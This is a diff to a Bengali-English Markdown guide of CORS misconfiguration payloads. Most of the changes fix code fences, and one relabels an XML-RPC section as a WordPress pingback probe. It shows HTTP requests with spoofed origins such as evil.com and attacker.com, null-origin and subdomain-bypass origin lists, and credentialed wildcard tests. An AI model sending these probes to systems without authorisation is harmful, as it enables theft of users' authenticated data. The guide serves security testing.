@@ -4,35 +4,30 @@
 > Complete payload list for detecting and exploiting CORS misconfigurations in modern web applications.
 
 🔴 পেলোড ১: Origin Reflection Test
-```
-http
+```http
 GET /api/accountDetails HTTP/1.1
 Host: target.com
 Origin: https://evil.com
 Cookie: session=abc123
 ```
 Response চেক করুন:
-```
-http
+```http
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://evil.com  ← আপনার origin আসলে VULNERABLE!
 Access-Control-Allow-Credentials: true
 ```
 🔴 পেলোড ২: Null Origin Test
-```
-http
+```http
 GET /api/accountDetails HTTP/1.1
 Host: target.com
 Origin: null
 Cookie: session=abc123
 ```
-🔴 পেলোড ৩: Subdomain Bypass (CVEs অনুযায়ী) 
-```
-http
+🔴 পেলোড ৩: Subdomain Bypass (CVEs অনুযায়ী)
+```http
 GET /api/accountDetails HTTP/1.1
 Host: target.com
 Origin: https://target.com.evil.com
-http
 Origin: https://evil.com.target.com
 Origin: https://trusted.example.com.evil.com
 ```
@@ -75,23 +70,20 @@ Attack ফলাফলে Access-Control-Allow-Origin কলাম দেখু�
 
 যে পেলোডগুলোর জন্য এই হেডার আপনার দেওয়া origin এর সাথে match করছে, সেগুলো vulnerable
 
-💣 ধাপ ৪: 2026 সালের Real CVE-ভিত্তিক Advanced Exploit 
-4.1 Access-Control-Allow-Origin: * + credentials scenario 
-```
-http
+💣 ধাপ ৪: 2026 সালের Real CVE-ভিত্তিক Advanced Exploit
+4.1 Access-Control-Allow-Origin: * + credentials scenario
+```http
 GET /api/memories HTTP/1.1
 Host: mcp-memory-service.local
 Origin: https://attacker.com
 ```
 Response দেখুন:
-```
-http
+```http
 Access-Control-Allow-Origin: *
 Access-Control-Allow-Credentials: true   ← CRITICAL! Wildcard + credentials = dangerous
 ```
-4.2 XML-RPC Server Exploit (CVE-2026-32610 style) 
-text
-```
+4.2 XML-RPC pingback probe (WordPress CVE-2013-0235 - SSRF/amplification class)
+```http
 POST /RPC2 HTTP/1.1
 Host: target.com
 Content-Type: text/plain
@@ -99,7 +91,7 @@ Origin: https://attacker.com
 
 <?xml version="1.0"?>
 <methodCall>
-    <methodName>getAll</methodName>
+    <methodName>pingback.ping</methodName>
 </methodCall>
 ```
 
@@ -161,3 +153,4 @@ Origin: https://api.target.com.evil.com
 Origin: https://target.com.evil.com/graphql
 Origin: https://target.com.evil.com/oauth
 Origin: https://target.com.evil.com/webauthn
+```
